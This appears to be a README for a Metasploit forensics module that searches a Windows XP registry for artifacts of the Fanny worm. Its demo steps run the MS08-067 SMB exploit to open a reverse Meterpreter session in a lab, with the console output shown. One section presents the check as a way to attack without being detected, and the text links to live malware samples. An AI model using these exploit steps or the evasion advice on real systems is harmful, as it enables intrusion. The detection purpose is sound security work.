## Vulnerable Application
Fanny or DWE for short. (DWE = DementiaWheel)

Detection module based on the post-/gather/forensics module duqu_check.rb,
Fanny is a worm that infects windows machines, via USB
(not trough Autorun, or at least not only).

in fact, It used exploits later found in StuxNet.
It creates creates some Registry artifacts.

This module is intended to detect those artifacts.

POC https://user-images.githubusercontent.com/68499986/102911824-e2678280-447c-11eb-8495-7180a52c7266.png


  #### supported Environments:
    - [x] Windows x86

  ####  supported SessionTypes:
    - [x]  Meterpreter
    - [x]  Shell

  #### supported OS's:
    - [x] Windows XP Pro (SP3)

-------------------------


## Verification Steps


- [x] First, Git clone the fanny_bmp_check.rb from https://github.com/loneicewolf/metasploit_fanny_check_module/blob/main/fanny_bmp_check.rb

- [x] place it into your msf folder, (important, check the following step before placing it) usually located in /root/.msf4/modules/

- [x] * make the following folders: (under each other) /post/windows/gather/forensics/ <fanny_bmp_check.rb here>

- [x] Start msfconsole

- [x] use exploit/windows/smb/ms08_067_netapi

- [x] set RHOST and LHOST.

- [x] msf6 exploit(windows/smb/ms08_067_netapi) > run

    [*] Started reverse TCP handler on 192.168.122.1:4444
    [*] 192.168.122.160:445 - Automatically detecting the target...
    [*] 192.168.122.160:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
    [*] 192.168.122.160:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
    [*] 192.168.122.160:445 - Attempting to trigger the vulnerability...
    [*] Sending stage (175174 bytes) to 192.168.122.160
    [*] Meterpreter session 4 opened (192.168.122.1:4444 -> 192.168.122.160:1043) at 2020-12-22 16:55:02 +0100

meterpreter > run post/windows/gather/forensics/fanny_bmp_check

    [*] Searching registry on WORKSTATION1 for Fanny.bmp artifacts.
    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\Driver found in registry.
    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter2 found in registry.
    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter3 found in registry.
    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter8 found in registry.
    [*] WORKSTATION1: 4 result(s) found in registry.

-------------------------

## Options

  No options
## Scenarios
Specific #demo


- [x] Start msfconsole

- [x] use exploit/windows/smb/ms08_067_netapi

- [x] set LHOST 192.168.122.1
- [x] set RHOST 192.168.122.160
- [x] set LPORT 4444

- [x] msf6 exploit(windows/smb/ms08_067_netapi) > run

    [*] Started reverse TCP handler on 192.168.122.1:4444 
    [*] 192.168.122.160:445 - Automatically detecting the target...
    [*] 192.168.122.160:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
    [*] 192.168.122.160:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
    [*] 192.168.122.160:445 - Attempting to trigger the vulnerability...
    [*] Sending stage (175174 bytes) to 192.168.122.160
    [*] Meterpreter session 4 opened (192.168.122.1:4444 -> 192.168.122.160:1043) at 2020-12-22 16:55:02 +0100

meterpreter > run post/windows/gather/forensics/fanny_bmp_check 

        [*] Searching registry on WORKSTATION1 for Fanny.bmp artifacts.
        [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\Driver found in registry.
        [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter2 found in registry.
        [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter3 found in registry.
        [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter8 found in registry.
        [*] WORKSTATION1: 4 result(s) found in registry.



### Typical Usage Scenario: Pen Test without being Detected

1 thing this could be used as, is (as with the duqu_check) to check,
if a target system (that you/your team is going to/will/plan to perform one or
more penetration tests on, already is infected by any of those, and it would
 probably make a nice looking "alert" to malware researchers who runs malwares
 into sandboxes and vms; (Because it would shortly make the system/vm
 more "targeted" if infected even more.


For example and if a VM(for example) is infected with Duqu,
Maybe it's not the most optimal 'thing' to infect it with anything
(else - in general, at all) By e.g Using metasploit,
(because, the system already is infected with
Duqu(if we take a Duqu Infected VM/System as an example),
Duqu - wich is kinda well known by now, will make the VM
(or if it is a real os, which still does happen) more suspected for malware.


### So, short story: the less malicious activity (the less "malware") on a system, the less detection risk is present.

I Will upload a POC video demonstrating this on Windows 10, x64. Sooner or later.
There's already a XP POC video located here
 - https://github.com/loneicewolf/fanny.bmp/blob/main/FannyMalware%20POC%20.mp4

"Equation Group Q&A PDF File" - Explaining (not only) Fanny, (but also many others, in the "same family" of malware)

 - https://github.com/loneicewolf/fanny.bmp/blob/main/Equation_group_questions_and_answers.pdf

If needed, I included malware samples on the same page.

 **It goes without saying that if you proceed to this page Please exercise caution.**

 - https://github.com/loneicewolf/fanny.bmp


-------------------------


## Version and OS

### Tested on

  - [x] Windows XP Pro SP3 English


-------------------------

## Contact info

Any questions or Improvements / Issues is welcomed either via mail or at the issues tab/page.
william-martens@protonmail.ch
